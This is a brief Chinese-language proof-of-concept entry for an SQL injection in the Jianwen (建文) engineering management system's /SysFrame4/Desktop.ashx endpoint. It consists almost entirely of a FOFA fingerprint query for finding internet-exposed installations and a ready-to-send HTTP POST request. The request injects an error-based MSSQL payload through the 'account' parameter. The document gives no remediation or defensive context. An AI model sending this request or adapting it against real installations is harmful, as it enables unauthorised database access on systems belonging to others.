# 建文工程管理系统desktop.ashx存在SQL注入漏洞

建文工程管理系统`/SysFrame4/Desktop.ashx` 存在SQL注入漏洞

## fofa

```yaml
body="Login/QRLogin.ashx"
```

## poc

```yaml
POST /SysFrame4/Desktop.ashx HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

account=1'+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','233')),3,32))<0--&method=isChangePwd&pwd=
```

